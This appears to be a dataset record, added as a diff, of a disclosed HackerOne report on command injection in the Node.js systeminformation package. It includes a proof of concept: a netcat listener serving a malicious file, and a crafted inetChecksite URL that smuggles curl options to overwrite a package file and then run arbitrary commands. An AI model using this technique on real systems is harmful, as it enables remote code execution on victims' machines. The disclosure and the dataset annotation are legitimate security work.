@@ -1,0 +1,49 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "effectrenan ",
+  "title": "[systeminformation] Command Injection via insecure command formatting",
+  "content": "\nI would like to report a Command Injection vulnerability in the systeminformation package. It allows an attacker to inject arbitrary OS commands.\nModule\nModule name: systeminformation\nVersion: 4.26.10\nnpm page: https://www.npmjs.com/package/systeminformation\nModule Description\nSystem and OS information library for node.js.\nModule Stats\nWeekly downloads: 363.195\nVulnerability\nVulnerability Description\nThe attacker can concatenate curl parameters to overwrite a Javascript file of the package and then execute any OS commands.\nThe child_process.exec() function executes the following command:\nCode 121 Bytes\n1curl -I --connect-timeout 5 -m 5 $urlSanitized 2>/dev/null | head -n 1 | cut -d \" \" -f2 # $urlSanitized is the user input\nSteps To Reproduce:\nCreate a Javascript file with content:\nCode 130 Bytes\n1const { exec } = require('child_process')\n2function inetChecksite(url) {\n3  return exec(url)\n4}\n5exports.inetChecksite = inetChecksite\nWe can use Netcat to create a TCP server to send back our Javascript file created before on 443 port:\nCode 26 Bytes\n1sudo nc -nlp 443 < file.js\nExecute the code bellow to overwrite the Javascript file:\nCode 337 Bytes\n1const si = require('systeminformation')\n2const HOST = \"127.0.0.1:443\"\n3\n4//The telnet was chosen to solve an issue with the protocol response check, like HTTP (HTTP/1.0 200 OK in the first line).\n5si.inetChecksite(`telnet://${HOST} --no-buffer -o node_modules/systeminformation/lib/internet.js`)\n6\n7setTimeout(() => {\n8  process.exit()\n9}, 2000)\nNow we can execute OS commands:\nCode 77 Bytes\n1const si = require('systeminformation')\n2si.inetChecksite(\"<Some OS command>\")\nPatch\nReplace:\nCode 42 Bytes\n1const exec = require('child_process').exec\nTo:\nCode 42 Bytes\n1const { spawn } = require('child_process')\nSupporting Material/References:\nArchLinux 5.4.50 x64\nNODEJS 14.5.0\nNPM 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nAn attacker can execute arbitrary OS commands on the victim's machine.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1605562920,
+  "report_url": "https://hackerone.com/reports/925324",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Set up a Netcat server to serve a malicious JavaScript file on port 443."
+    ],
+    [
+      2,
+      "Use the systeminformation package's inetChecksite function to overwrite the package's JavaScript file with the malicious one via a crafted URL."
+    ],
+    [
+      3,
+      "Execute arbitrary OS commands by calling the overwritten function in the systeminformation package."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a command injection in the systeminformation package where an attacker can concatenate curl parameters to overwrite a JavaScript file of the package and then execute arbitrary OS commands. The issue arises from the use of child_process.exec() with insufficient input sanitization.",
+  "reason": "The attack involves multiple components including setting up a server, crafting a malicious URL, and understanding the package's internal file structure. However, the steps are straightforward once the initial setup is done, and the interaction between components is not particularly subtle.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via insecure command formatting in the systeminformation package, which is not related to authentication or authorization boundaries within an application. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by manipulating user sessions and resource IDs within the same application context, not command injection vulnerabilities in third-party packages.",
+    "is_detectable": false
+  }
+}
